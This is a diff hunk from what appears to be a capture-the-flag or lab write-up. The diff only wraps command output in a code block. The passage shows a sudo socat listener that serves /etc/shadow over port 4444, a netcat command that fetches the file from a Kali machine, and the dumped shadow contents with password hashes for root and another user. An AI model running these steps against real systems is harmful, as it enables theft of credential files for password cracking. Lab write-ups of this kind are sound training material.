@@ -266,7 +266,8 @@ sudo socat TCP4-LISTEN:4444,reuseaddr OPEN:/etc/shadow
 ```bash
 (kali machine) netcat 10.10.120.193 4444
 ```
-> root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7:::
+```
+root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7:::
 daemon:*:17647:0:99999:7:::
 bin:*:17647:0:99999:7:::
 sys:*:17647:0:99999:7:::
@@ -329,7 +330,7 @@ pollinate:*:18281:0:99999:7:::
 falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
 sshd:*:18281:0:99999:7:::
 mysql:!:18281:0:99999:7:::
-
+```
 we will copy this shadow file to our local kali machine
 
 ``` bash
